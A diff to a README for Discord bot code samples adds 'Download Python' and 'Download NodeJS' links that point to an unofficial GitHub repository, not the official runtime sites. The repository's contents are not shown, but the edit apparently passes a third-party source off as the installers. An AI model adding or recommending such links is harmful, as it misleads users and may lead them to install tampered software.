@@ -26,6 +26,7 @@ async def on_message(message):
 client.run(os.getenv('TOKEN'))
 ```
 ### Before use (python)
+[Download Python](https://github.com/frostmint/dl)
 ```
 Microsoft Windows [Version 10.0.19041.264]
 (c) 2020 Microsoft Corporation. All rights reserved.
@@ -57,6 +58,7 @@ client.on("message", msg => {
 client.login(process.env.TOKEN)
 ```
 ### Before use (javascript)
+[Download NodeJS](https://github.com/frostmint/dl/)
 ```
 Microsoft Windows [Version 10.0.19041.264]
 (c) 2020 Microsoft Corporation. All rights reserved.
